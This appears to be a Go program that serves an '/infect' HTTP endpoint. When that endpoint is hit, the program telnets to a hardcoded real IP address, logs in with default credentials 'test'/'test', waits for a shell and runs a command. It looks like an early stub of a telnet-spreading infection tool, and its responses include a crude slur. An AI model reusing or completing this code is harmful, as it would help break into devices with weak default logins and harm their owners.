package main

import (
	"io"
	"net/http"
	"telnet"
	"log"
	//"os"
	"time"
)

const timeout = 10 * time.Second

func checkErr(err error) {
	if err != nil {
		log.Fatalln("Error:", err)
	}
}

func expect(t *telnet.Conn, d ...string) {
	checkErr(t.SetReadDeadline(time.Now().Add(timeout)))
	checkErr(t.SkipUntil(d...))
}

func sendln(t *telnet.Conn, s string) {
	checkErr(t.SetWriteDeadline(time.Now().Add(timeout)))
	buf := make([]byte, len(s)+1)
	copy(buf, s)
	buf[len(s)] = '\n'
	_, err := t.Write(buf)
	checkErr(err)
}


func infect(w http.ResponseWriter, r *http.Request) {
	io.WriteString(w, "PEDO!")
	dst_ip := "212.237.16.229"
	dst := dst_ip+":23"
	
	//var data []byte	
	t, err := telnet.Dial("tcp", dst)
	checkErr(err)
	t.SetUnixWriteMode(true)
	user := "test" 
	passwd := "test"
	expect(t, "login: ")
	sendln(t, user)
	expect(t, "ssword: ")
	sendln(t, passwd)
	expect(t, "$")
	sendln(t, "ls -l")

}
func hello1(w http.ResponseWriter, r *http.Request) {
        io.WriteString(w, "CACA!")
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/infect", infect)
	http.ListenAndServe(":8000", mux)
}

